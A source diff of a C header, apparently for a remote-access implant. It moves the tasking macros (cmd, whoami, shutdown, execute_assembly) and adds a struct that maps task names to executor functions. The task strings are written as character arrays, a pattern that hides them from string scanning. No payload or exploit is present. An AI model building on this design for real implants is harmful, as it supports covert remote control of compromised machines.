@@ -12,11 +12,6 @@ typedef struct Task_
     CHAR* agentUuid;
 } Task, *PTask;
 
-#define TASK_CMD (CHAR[]){ 'c', 'm', 'd', 0 }
-#define TASK_WHOAMI (CHAR[]){ 'w', 'h', 'o', 'a', 'm', 'i', 0 }
-#define TASK_SHUTDOWN (CHAR[]){ 's', 'h', 'u', 't', 'd', 'o', 'w', 'n', 0 }
-#define TASK_EXECUTE_ASSEMBLY (CHAR[]){ 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', 0 }
-
 /**
  * @typedef TaskExecutor
  *
@@ -38,5 +33,37 @@ typedef struct Task_
  * @return BOOL: Returns TRUE if the task was executed successfully, otherwise returns FALSE.
  */
 typedef BOOL (*TaskExecutor)(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _Inout_opt_ DLL* pEsgStdDll, _In_ Task task, _Out_ CHAR** taskResult, _Out_ DWORD* pdwSizeOfOutput);
+
+/**
+ * @struct TaskMapping_
+ * @brief A structure that maps a task type to its corresponding task executor function.
+ *
+ * This structure is used to associate a specific task type with a function that can
+ * execute that task. It allows for dynamic execution of tasks based on their type.
+ *
+ * @member taskType
+ * A pointer to a constant character string that represents the type of the task.
+ * This string is used to identify the task and should be unique for each task type.
+ *
+ * @member executor
+ * A function pointer of type TaskExecutor that points to the function responsible for
+ * executing the task associated with the taskType. This function will be called to
+ * perform the task when needed.
+ *
+ * @typedef TaskMapping
+ * A typedef for the TaskMapping_ structure for easier reference.
+ *
+ * @typedef PTaskMapping
+ * A typedef for a pointer to the TaskMapping structure.
+ */
+typedef struct TaskMapping_ {
+    const char* taskType;
+    TaskExecutor executor;
+} TaskMapping, *PTaskMapping;
+
+#define TASK_CMD (CHAR[]){ 'c', 'm', 'd', 0 }
+#define TASK_WHOAMI (CHAR[]){ 'w', 'h', 'o', 'a', 'm', 'i', 0 }
+#define TASK_SHUTDOWN (CHAR[]){ 's', 'h', 'u', 't', 'd', 'o', 'w', 'n', 0 }
+#define TASK_EXECUTE_ASSEMBLY (CHAR[]){ 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', 0 }
 
 #endif // TASK_H
